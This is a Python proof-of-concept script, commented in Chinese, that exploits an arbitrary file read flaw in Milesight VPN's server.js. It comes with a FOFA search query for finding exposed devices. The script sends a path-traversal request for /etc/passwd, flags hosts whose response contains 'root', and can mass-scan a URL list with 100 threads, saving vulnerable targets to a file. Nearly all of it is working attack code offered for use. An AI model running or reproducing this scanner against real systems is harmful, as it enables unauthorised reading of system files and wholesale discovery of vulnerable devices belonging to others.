#Milesight VPN server.js 任意文件读取漏洞
#fofa：body="MilesightVPN"

import requests,sys,argparse,json
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
███╗   ███╗██╗██╗     ███████╗███████╗██╗ ██████╗ ██╗  ██╗████████╗    ██╗   ██╗██████╗ ███╗   ██╗        ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗         ██╗███████╗
████╗ ████║██║██║     ██╔════╝██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝    ██║   ██║██╔══██╗████╗  ██║        ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗        ██║██╔════╝
██╔████╔██║██║██║     █████╗  ███████╗██║██║  ███╗███████║   ██║       ██║   ██║██████╔╝██╔██╗ ██║        ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝        ██║███████╗
██║╚██╔╝██║██║██║     ██╔══╝  ╚════██║██║██║   ██║██╔══██║   ██║       ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║        ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗   ██   ██║╚════██║
██║ ╚═╝ ██║██║███████╗███████╗███████║██║╚██████╔╝██║  ██║   ██║███████╗╚████╔╝ ██║     ██║ ╚████║███████╗███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║██╗╚█████╔╝███████║
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝╚══════╝ ╚═══╝  ╚═╝     ╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝ ╚════╝ ╚══════╝
                                                                                                                                                                              
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Milesight_VPN_server.js任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parser.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in  fp.readlines(): 
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def poc(target):
    payload = "/%2e%2e/etc/passwd"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(target+payload,headers=headers,verify=False,timeout=5,proxies=proxies)
        if res1.status_code==200 and 'root' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")  




if __name__ =='__main__':
    main()

